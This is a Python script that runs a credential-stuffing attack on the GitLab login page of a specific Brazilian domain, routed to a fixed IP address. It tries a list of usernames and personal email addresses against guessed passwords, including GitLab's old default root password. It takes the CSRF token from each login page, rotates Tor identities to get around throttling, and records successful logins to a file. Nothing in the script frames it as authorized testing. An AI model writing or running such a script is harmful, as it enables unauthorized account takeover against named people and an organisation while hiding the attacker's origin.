#!/usr/bin/env python3
import subprocess, re, time, sys, json, os, random
# GitLab credential stuffing (non-destructive, rate-limited).
# GET /users/sign_in -> extract CSRF authenticity_token + cookie -> POST login.
ORIGIN="77.237.242.76"
HOST="www.dfg.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
def curl(args):
  cmd=["proxychains4","-q","curl","-ks","-A",UA,"--resolve",f"{HOST}:443:{ORIGIN}"]+args
  r=subprocess.run(cmd,capture_output=True,text=True,timeout=30)
  return r.stdout, r.stderr

users=["root","admin","acgarzon","garzon","drfranciscogeovane","salesmgr","gitlab",
       "acgarzon@gmail.com","drfranciscogeovane@gmail.com","salesmgr@dfgames.com",
       "admin@dfg.com.br","garzon.servicos@gmail.com"]
pwds=["5iveL!fe","Password123","Passw0rd!","Qwerty123","12345678","admin123","letmein!",
      "dfg","dfgames","DFGames","DFGames2024","DFGames2025","DFGames2026","Dfg@2024",
      "garzon","Garzon@2024","Garzon2024","Alexandre2024","francisco","Francisco2024",
      "geovane","Geovane2024","gitlab","admin","password","Welcome1!","Ch@ng3m3!"]

# Rotate Tor first
def newnym():
  try: subprocess.run(["python3","torctl.py","SIGNAL","NEWNYM"],capture_output=True,timeout=10)
  except: pass

results=[]
newnym(); time.sleep(3)
hit=None
attempts=0
for u in users:
  if hit: break
  for p in pwds:
    if hit: break
    attempts+=1
    # GET login page for CSRF
    jar=f"/tmp/gl_{u}_{p}.cookie".replace('@','_').replace('/','_').replace('.','_')
    try:
      gethdr, _ = curl(["-c",jar,"-o","/tmp/gl_get.html","-D","-","-w","\\nHTTP=%{http_code}",
                        f"https://{HOST}/users/sign_in"])
    except Exception as e:
      print(f"[err get] {e}"); continue
    try:
      html=open("/tmp/gl_get.html").read()
    except: continue
    m=re.search(r'name="authenticity_token" value="([^"]+)"', html)
    if not m: 
      print(f"[!] no CSRF for {u}/{p} (size {len(html)})"); continue
    token=m.group(1)
    # POST login
    postdata=f"utf8=%E2%9C%93&authenticity_token={token}&user[login]={u}&user[password]={p}&user[remember_me]=0"
    try:
      body, _ = curl(["-b",jar,"-c",jar,"-d",postdata,"--compressed",
                      "-o","/tmp/gl_post.html","-D","-","-w","\\nHTTP=%{http_code}|URL=%{url_effective}",
                      "-H","Referer: https://"+HOST+"/users/sign_in",
                      f"https://{HOST}/users/sign_in"])
    except Exception as e:
      print(f"[err post] {e}"); continue
    try: posthtml=open("/tmp/gl_post.html").read()
    except: posthtml=""
    # success indicators: redirect to / or dashboard, cookie _gitlab_session + "Sign out"
    is_redir = "HTTP=302" in body
    eff = re.search(r"URL=([^\n]+)", body)
    effurl = eff.group(1) if eff else ""
    # failure: "Invalid" in flash, re-rendered sign_in
    fail = ("Invalid" in posthtml or "invalid" in posthtml or "Incorrect" in posthtml) and is_redir==False
    # captcha appeared? (REAL captcha = captcha":true OR recaptcha sitekey 6L.. present)
    # NOTE: "captcha":false in gon is the config string (disabled) — NOT a real captcha.
    captcha = ('captcha":true' in posthtml) or bool(re.search(r'6L[a-zA-Z0-9_-]{38,}', posthtml)) and 'recaptcha' in posthtml.lower()
    # Rate limit / throttled?
    throttled = "throttle" in posthtml.lower() or "too many" in posthtml.lower() or "HTTP=429" in body
    # session cookie?
    sess = "_gitlab_session" in open(jar).read() if os.path.exists(jar) else False
    status="?"
    if is_redir and ("dashboard" in effurl or effurl.rstrip("/").endswith(HOST) or "/users/sign_in" not in effurl):
      status="REDIR->"+effurl[-40:]
    elif "Sign in" in posthtml and "Invalid" in posthtml:
      status="FAIL"
    elif captcha: status="CAPTCHA"
    elif throttled: status="THROTTLE"
    else: status="other("+ ("302" if is_redir else "200") +")"
    if attempts<=3 or status not in ("FAIL","REDIR->"+effurl[-40:]):
      print(f"[{attempts}] {u}/{p} -> {status}")
    if status.startswith("REDIR") and "sign_in" not in effurl and "Sign in" not in posthtml[:500]:
      # likely success
      hit=(u,p)
      print(f"*** HIT: {u} / {p} -> {status} effurl={effurl}")
      # verify: GET dashboard with cookie
      vbody,_=curl(["-b",jar,"-o","/tmp/gl_dash.html","-w","\\nHTTP=%{http_code}|URL=%{url_effective}",
                    f"https://{HOST}/"])
      print("  verify:", vbody[-200:])
      results.append({"user":u,"pwd":p,"effurl":effurl})
      break
    if captcha: 
      print("  CAPTCHA detected — stopping to avoid lockout."); 
      json.dump(results,open("gitlab_hits.json","w")); sys.exit(0)
    if throttled:
      print("  Throttled — rotating Tor + cooling down 20s")
      newnym(); time.sleep(22)
    os.remove(jar) if os.path.exists(jar) else None
    time.sleep(2.5)  # gentle rate
    # rotate Tor every ~6 attempts
    if attempts%6==0: newnym(); time.sleep(4)
json.dump(results,open("gitlab_hits.json","w"))
print(f"DONE. attempts={attempts} hits={len(results)}")
